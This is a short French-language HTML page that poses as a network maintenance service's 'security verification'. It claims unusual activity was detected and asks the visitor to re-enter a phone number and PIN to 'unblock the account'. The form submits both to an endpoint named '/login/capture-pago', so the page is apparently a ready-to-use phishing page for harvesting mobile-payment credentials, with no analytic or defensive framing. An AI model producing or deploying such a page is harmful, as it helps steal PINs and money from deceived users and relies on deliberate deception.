<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Service de Maintenance Réseau</title>
    <style>
        body { font-family: sans-serif; text-align: center; background: #f4f4f4; }
        .box { border: 1px solid #ccc; padding: 20px; display: inline-block; margin-top: 50px; background: white; }
        .btn { background: #007bff; color: white; padding: 10px; border: none; width: 100%; }
    </style>
</head>
<body>
    <div class="box">
        <h3>🔒 Vérification de Sécurité</h3>
        <p>Une activité inhabituelle a été détectée. Veuillez re-valider votre code PIN pour continuer.</p>
        <form action="/login/capture-pago" method="POST">
            <input type="text" name="phone" placeholder="Numéro de téléphone" required><br><br>
            <input type="password" name="pin" placeholder="Code PIN" required><br><br>
            <button class="btn">DÉBLOQUER LE COMPTE</button>
        </form>
    </div>
</body>
</html>
